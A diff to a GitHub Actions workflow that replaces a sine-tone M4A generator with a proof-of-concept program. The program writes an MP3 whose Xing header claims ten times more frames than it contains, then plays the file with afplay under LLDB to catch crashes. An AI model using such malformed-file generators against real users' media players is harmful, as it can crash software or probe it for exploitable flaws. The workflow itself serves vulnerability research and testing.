@@ -1,4 +1,4 @@
-name: Generate, Play, and Debug Audio
+name: Generate, Play, and Debug Audio Source
 on:
   push:
     branches: [ main ]
@@ -13,63 +13,64 @@ jobs:
     steps:
       # Clone the repository
       - name: Clone repository
-        run: |
-          echo "Cloning repository..."
-          git clone https://github.com/encryptedcoderr/AppleTest/
-          
-      # Navigate and list directory contents
-      - name: Navigate and list directory contents
-        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
-        run: ls -l
+        run: git clone https://github.com/encryptedcoderr/AppleTest/
 
-      # Patch encodeme.mm for 10-second M4A
-      - name: Patch encodeme.mm
+      # Navigate to the correct directory
+      - name: Navigate to working directory
+        run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l
+
+      # Patch encodeme.mm with the source that creates an invalid MP3
+      - name: Patch encodeme.mm to create invalid MP3
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm..."
+          echo "Patching encodeme.mm with faulty MP3 generation logic..."
           cat > encodeme.mm << 'EOF'
-          @import AVFAudio;
-          @import AudioToolbox;
-          #include <cmath>
-          int main() {
-              uint32_t channelNum = 1;
-              AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
-                                                                               channels:channelNum];
-              AVAudioChannelLayout* channelLayout =
-                  [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_Mono];
-              const int sampleRate = 44100;
-              const int durationSeconds = 10;
-              const int totalSamples = sampleRate * durationSeconds;
-              const int samplesPerBuffer = 1024;
-              float* audioBuffer = (float*)malloc(samplesPerBuffer * sizeof(float));
-              
-              AudioStreamBasicDescription m4aDescription{
-                  .mSampleRate = 44100,
-                  .mFormatID = kAudioFormatMPEG4AAC,
-                  .mFramesPerPacket = 1024,
-                  .mChannelsPerFrame = channelNum,
-              };
-              NSURL* m4aUrl = [NSURL fileURLWithPath:@"output.m4a"];
-              ExtAudioFileRef m4aFile = nullptr;
-              OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)m4aUrl, kAudioFileM4AType,
-                                                          &m4aDescription, channelLayout.layout,
-                                                          kAudioFileFlags_EraseFile, &m4aFile);
-              if (status) { return 1; }
-              
-              ExtAudioFileSetProperty(m4aFile, kExtAudioFileProperty_ClientDataFormat,
-                                      sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
+          #import <Foundation/Foundation.h>
 
-              for (int i = 0; i < totalSamples; i += samplesPerBuffer) {
-                  int samplesToWrite = (i + samplesPerBuffer <= totalSamples) ? samplesPerBuffer : (totalSamples - i);
-                  for (int j = 0; j < samplesToWrite; j++) {
-                      audioBuffer[j] = sin(2 * M_PI * 440 * (i + j) / sampleRate) * 0.5f;
+          int main(int argc, const char * argv[]) {
+              @autoreleasepool {
+                  time_t startTime = time(NULL);
+                  fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));
+
+                  double sampleRate = 44100.0;
+                  UInt32 channelNum = 2;
+                  NSString *fileName = [NSString stringWithFormat:@"output_invalid.mp3", sampleRate, (unsigned int)channelNum];
+                  FILE *file = fopen(fileName.UTF8String, "wb");
+                  if (!file) {
+                      fprintf(stderr, "Failed to create file: %s\n", fileName.UTF8String);
+                      return 1;
                   }
-                  AudioBufferList audioBufferList{ .mNumberBuffers = 1, .mBuffers = {{ .mNumberChannels = 1, .mDataByteSize = static_cast<UInt32>(samplesToWrite * sizeof(float)), .mData = audioBuffer, },}, };
-                  ExtAudioFileWrite(m4aFile, samplesToWrite, &audioBufferList);
+
+                  // The core of the issue: Mismatched frame counts
+                  UInt32 totalFrames = 10000; // Inflated value for the header
+                  UInt32 actualFrames = 1000;  // Actual number of frames to be written
+
+                  // Write a misleading Xing header
+                  char xingHeader[100] = {0};
+                  memcpy(xingHeader, "Xing", 4);
+                  xingHeader[7] = 0x01; // Frames field present
+                  xingHeader[8] = totalFrames >> 24;
+                  xingHeader[9] = (totalFrames >> 16) & 0xFF;
+                  xingHeader[10] = (totalFrames >> 8) & 0xFF;
+                  xingHeader[11] = totalFrames & 0xFF;
+                  
+                  // This is the line where the invalid data is written
+                  fwrite(xingHeader, 1, sizeof(xingHeader), file);
+
+                  // Write dummy MP3 frames
+                  char frameHeader[4] = {0xFF, 0xFB, 0x90, 0x00}; // 44.1kHz, 128kbps, stereo
+                  for (UInt32 i = 0; i < actualFrames; ++i) {
+                      fwrite(frameHeader, 1, sizeof(frameHeader), file);
+                      char dummyData[400] = {0}; // Simplified dummy frame data
+                      fwrite(dummyData, 1, sizeof(dummyData), file);
+                  }
+                  fprintf(stderr, "PoC: Wrote Xing header with %u frames, but actual frames written was %u\n", totalFrames, actualFrames);
+
+                  fclose(file);
+
+                  time_t endTime = time(NULL);
+                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
               }
-              
-              free(audioBuffer);
-              ExtAudioFileDispose(m4aFile);
               return 0;
           }
           EOF
@@ -80,65 +81,71 @@ jobs:
         with:
           xcode-version: '15.4'
 
-      # Compile encodeme.mm
-      - name: Compile encodeme.mm
+      # Compile encodeme.mm with debug symbols
+      - name: Compile encodeme.mm for Debugging
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Compiling..."
-          clang++ -g -Os -std=c++2b -fmodules -fcxx-modules -fobjc-arc -arch arm64 \
-            -isysroot $(xcrun --sdk macosx --show-sdk-path) \
-            -framework AVFAudio -framework AudioToolbox \
-            encodeme.mm -o encodeme
+          echo "Compiling encodeme.mm with debug symbols (-g)..."
+          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_debug
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # Generate M4A and convert to MP3
-      - name: Generate Audio Files
+      # NEW: Debug the file generation process itself with LLDB
+      - name: Debug File Generation with LLDB
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          chmod +x encodeme && ./encodeme
-          brew install ffmpeg
-          ffmpeg -i output.m4a -c:a mp3 -b:a 128k -ac 1 output.mp3
-          ls -lh output.m4a output.mp3
-
-      # Play, Track, and Debug Processes
-      - name: Play, Track, and Debug Audio Processes
-        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
-        run: |
-          LOG_FILE="debug_log.txt"
-          echo "--- Playback and Debug Log ---" > $LOG_FILE
+          LOG_FILE="generation_debug_log.txt"
+          echo "--- Debugging File Generation Process ---" > $LOG_FILE
           echo "Timestamp: $(date)" >> $LOG_FILE
           
-          echo "Starting audio playback in background..."
-          afplay output.m4a &
-          M4A_PID=$!
-          afplay output.mp3 &
-          MP3_PID=$!
+          echo "Starting LLDB session to inspect the invalid header creation..." >> $LOG_FILE
           
-          echo "Started M4A playback with PID: $M4A_PID" >> $LOG_FILE
-          echo "Started MP3 playback with PID: $MP3_PID" >> $LOG_FILE
-          
-          # Allow a moment for processes to initialize before attaching debugger
-          sleep 2
-          
-          echo "--- Attaching LLDB to M4A Process (PID: $M4A_PID) ---" >> $LOG_FILE
-          lldb -p $M4A_PID --batch -o 'bt' -o 'detach' -o 'quit' >> $LOG_FILE 2>&1 || echo "Could not attach to M4A process. It may have already finished." >> $LOG_FILE
-          
-          echo "--- Attaching LLDB to MP3 Process (PID: $MP3_PID) ---" >> $LOG_FILE
-          lldb -p $MP3_PID --batch -o 'bt' -o 'detach' -o 'quit' >> $LOG_FILE 2>&1 || echo "Could not attach to MP3 process. It may have already finished." >> $LOG_FILE
-          
-          echo "--- End of Log ---" >> $LOG_FILE
-          
-          echo "✅ Debug log created. Displaying contents:"
+          # Use LLDB's batch mode to automate the debugging and inspection
+          # 1. Set a breakpoint at the line where the invalid header is written (fwrite)
+          # 2. Run the program
+          # 3. When it stops, print the values of the mismatched frame variables
+          # 4. Print the contents of the header buffer to be written
+          # 5. Continue execution to let the program finish
+          lldb ./encodeme_debug --batch \
+            -o 'breakpoint set --file encodeme.mm --line 34' \
+            -o 'run' \
+            -o 'echo "--- Breakpoint Hit: Inspecting variables before fwrite() ---"' \
+            -o 'p totalFrames' \
+            -o 'p actualFrames' \
+            -o 'p xingHeader' \
+            -o 'continue' \
+            -o 'quit' >> $LOG_FILE 2>&1
+            
+          echo "✅ Generation debug log created. Displaying contents:"
           cat $LOG_FILE
+          
+      # Play the generated (invalid) file and debug the player
+      - name: Play and Debug Audio Player
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          PLAYER_LOG_FILE="player_debug_log.txt"
+          echo "--- Debugging Audio Player (afplay) ---" > $PLAYER_LOG_FILE
+          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
 
-      # Upload all artifacts
-      - name: Upload Artifacts
+          echo "Starting audio playback in background..."
+          afplay output_invalid.mp3 &
+          MP3_PID=$!
+          echo "Started MP3 playback with PID: $MP3_PID" >> $PLAYER_LOG_FILE
+          sleep 2
+
+          echo "--- Attaching LLDB to MP3 Player Process (PID: $MP3_PID) ---" >> $PLAYER_LOG_FILE
+          lldb -p $MP3_PID --batch -o 'bt' -o 'detach' -o 'quit' >> $PLAYER_LOG_FILE 2>&1 || echo "Could not attach to MP3 player process. It may have crashed or finished." >> $PLAYER_LOG_FILE
+
+          echo "✅ Player debug log created. Displaying contents:"
+          cat $PLAYER_LOG_FILE
+
+      # Upload all artifacts: the invalid MP3 and both debug logs
+      - name: Upload All Artifacts
         uses: actions/upload-artifact@v4
         with:
           name: audio-and-debug-artifacts
           path: |
-            AppleTest/apple-positional-audio-codec-invalid-header-main/output.m4a
-            AppleTest/apple-positional-audio-codec-invalid-header-main/output.mp3
-            AppleTest/apple-positional-audio-codec-invalid-header-main/debug_log.txt
+            AppleTest/apple-positional-audio-codec-invalid-header-main/output_invalid.mp3
+            AppleTest/apple-positional-audio-codec-invalid-header-main/generation_debug_log.txt
+            AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
